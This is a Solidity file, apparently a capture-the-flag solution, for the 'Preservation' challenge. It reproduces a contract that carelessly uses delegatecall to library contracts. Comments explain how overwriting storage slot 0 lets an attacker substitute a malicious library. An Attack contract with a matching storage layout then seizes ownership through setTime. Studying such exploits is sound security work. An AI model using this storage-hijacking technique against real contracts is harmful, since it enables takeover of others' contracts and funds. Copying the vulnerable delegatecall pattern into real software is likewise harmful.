/**
 *Submitted for verification at Etherscan.io on 2022-08-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

/**
 * On observing closely the storage layout of LibraryContract & Preservation contract
 * We conclude that whenever setFirstTime is called, variable at SLOT 0 is updated
 * In Preservation contract SLOT 0 => timeZone1Library
 * In LibraryContract SLOT 0 => storedTime
 *  storedTime can by anything, uint implies bytes32 and an address is also bytes32
 *  What if we update storedTime to a malicious contract address? and use it to accomplish the hack?
 * Notes on delegatecall:
 *  Whenever delegate call is used the code at the target address is executed in the context (i.e. at the address) of the calling contract and msg.sender and msg.value do not change their values.
 *   This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.
 *
 *  Since the code will be executed in the context of the calling contract i.e. Preservation contract
 *  Plus, Storage still refers to the calling contract. [USING THIS WE CAN ACCOMPLISH THE HACK]
*/
contract Attack {
    // The storage layout for this contract must be same as that of Preservation contract
    address public timeZone1Library; // SLOT 0
    address public timeZone2Library; // SLOT 1
    address public owner; // SLOT 2
    uint storedTime; // SLOT 3

    /**
    * We must use setTime as function name as Preservation contract uses bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
    * Once we assign owner = msg.sender [THIS WOULD ACTUALLY CHANGE THE OWNER VALUE IN PRESERVATION CONTRACT DUE TO USAGE OF delegatecall]
    */
    function setTime(uint time) public {
        time;
        owner = msg.sender;
    }

    /**
    * Utility function to convert address to Uint
    */
    function addressToUint(address addr) public pure returns (uint256) {
        return uint256(addr);
    }
}